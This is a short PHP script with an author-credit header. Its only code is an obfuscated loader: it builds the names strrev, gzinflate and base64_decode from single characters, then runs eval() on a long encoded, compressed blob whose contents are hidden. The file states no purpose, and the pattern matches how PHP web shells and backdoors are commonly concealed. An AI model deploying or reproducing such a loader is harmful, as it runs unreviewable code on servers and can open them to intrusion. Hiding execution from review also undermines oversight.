<?php																								/***
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Name		  :	Tubagus Sya'banii
Youtube		  :	I'am Tubasya
Instagram	  :	@im.tubasya
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Date              :     2021-10-12 20:15:11 WIB
Ip Address        :     Null
City              :     Tangerang City
Country           :     ID (Indonesian)
Region            :     Banten / East Java
User-Agent        :     Mozilla/5.0 (X11; Linux x86_64; Android 10; ASUS X00TD ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 						***/

/*Please Don't Copy My Script!! ~ By : Iam Tubasya */

/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/* START */ $ukJ='c';$wB='s';$Tv='t';$wh='_';$U='g';$AvKeQ='i';$rxX='v';$M='b';$sHXdT='n';$RwIgh='r';$TqcT='e';$NOkUL='f';$xc='d';$tu='l';$At='z';$Jb='a';$UD='6';$PCb='o';$ouWTR='4';$ZdWpd=$wB.$Tv.$RwIgh.$RwIgh.$TqcT.$rxX;$xPfF=$U.$At.$AvKeQ.$sHXdT.$NOkUL.$tu.$Jb.$Tv.$TqcT;$LhPf=$M.$Jb.$wB.$TqcT.$UD.$ouWTR.$wh.$xc.$TqcT.$ukJ.$PCb.$xc.$TqcT;eval($xPfF($ZdWpd($LhPf('AP9/8T/adap7STnbv1n5XX9Hq+o3atq4/KRWx55PlwrX11xvPSQoVpoHavHc2Z4XLy4R0LiHefrSpNwG8eGtrGGGtWqfuHVpPd2lmp7RpPdyB9JwS08tU3DFE8xo8cta4SpR3VDxqOyhETUK9cosMs7RG/wndlliXjeMwTXhvIWuVZcLX30QoYOqGvFDCCiuzq3rMMZoxCOGZJ4IzoFnLlxmsLT3MtdpltzIhlw0pc6i9EpEg5SsKr/fucxY1HW/WoyODGxMiD88+f0AALsHKWNO5thF36B/EPyzBqhH6lT0d+NKh84R09JbW8xcfgV1Ov4Bn89dFEIpNYS6//hLoeEuh4S6HhLoe1HusHrRWj0e3+bEE8qS61i1Ow2L1oochPo+RfYaauOr6YVrDZ6dqB2n/c2b9ryJTejtQfk7DEWNYDGFHtngLzMEEkFyPnnKPanfCk9gQo+I0gu8oWPKaDokKWyEHQMO7nuoAXhKok+1EJF1i48BZ4I0czMPACrvCsI9I3jrMl3tW9CGzy7lSrpeNnHEXX7dZxhqr0Dfr/v5UuETx31NHQeIjMSLEsimjG5LDgYw3iJhBSWIa9N+Ot+jdeL7Rhuj73JcYgutUbNezTTchX/o3HGO1fsx36DmG/cj7tAsnbq2aq1u7We7t23cdI+/Nw2X/4LzPbu36Dags6fDLPnmIoX4T74ZZi7Aucd14DoGN0rCjp3U2Rfsn+aYxeUQuW9ufRxKEvE+Arj8eQksonOtakAfn2ij2YgzgRQZcegs7Ee12lx6DLTzHTzK6QCc6tiTbJCvaf1/nW0HjtsNcB+mfxwFElXc5Wni11sdt8ZMmSXsayFOLJBByxRkmhlGaMTRnIzw6ifnhQi7yqlIfVeYMhtV5pfJ5SiKVFGUbAnLXYAX92gEjDK8nmPXAVHslbEUpv758X4DiTgtF5lpwnlTPPnLT5jMeHHAUvgSE7eMMTlJbVfrhdrv9ayCv62Vp3yQX7m59xduijlmpJ92Wgos12XX8gXZOwhur2bs0d1F5MT/es3OZDepANzrvTb42559BFZ+v/jPcHm3c+TbvOm2E4Yl5VSSfDJfHqtQciaJ0uCUli7kZf94u/90yXdcGdMHEAnA7WqokyOiNRwcwO6b5HSmEqeJvZpO5BJu7eO/Eb58v28j1eNlyDMagKOEuDMVVnZIMoAfbs2YHVHvj/iT7b7uP5fK9xPPFDhWyqtg+He3D83/X5VSUJPRPL8ho4V2y+JQcOPhPxwjA3NyLNPqC9e8rtiz1WudsZUVxD3IHOWfIWWgUhavHBIQ4DAQdiXepwfbTVQX7e/uoLVDk/ygm8TG1BdvK6yCcCFfBwLO2nmmq8yCHi1JYoP5ZhXy6Gfp3PqoLunvaVqa9agKtVNVJQbYeJtdVAVpg3Y2mQBagfzA47Efep8rLkI4OZL804WstGUQD70EcoICsil2HPL4RH8CJiQH8HQc/IQr5bnsMWRdc81KBZKJvLVbQ+Qx66GVlHppQDLOBCQ6IjaCMewr7+fy/cDauhbIV4/IG6AnC3hA7xMnHwXlVGOxqKt4Cqm3Yl24ijCRoStSUCQd6YEl704JW3yoSBMlQkXYLS0YtF2ph6iUFMPcpQCdLnYI1EkHfEVviDxEkdwMCMRJjn922kTEvgjkSoSi3KUd2LgVehGolBS91KQYZ/4+LVRKClqolAiCdCNRKClLEpx4YD8wS0xi9gy8IEYpUgknBmMe2AqUTC2+LFC85XVEE2wLf2P4Xs/ni845z45zp9JPp8VJlJd7t2zpfxYP8lYV9gX08+yD7V7O2L27kXIuTundA3JK7YxtALYoydNOmabBgEpgSAS26haEkODBbIbsnqhTz74UONpy3Vjt'))));
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
?>
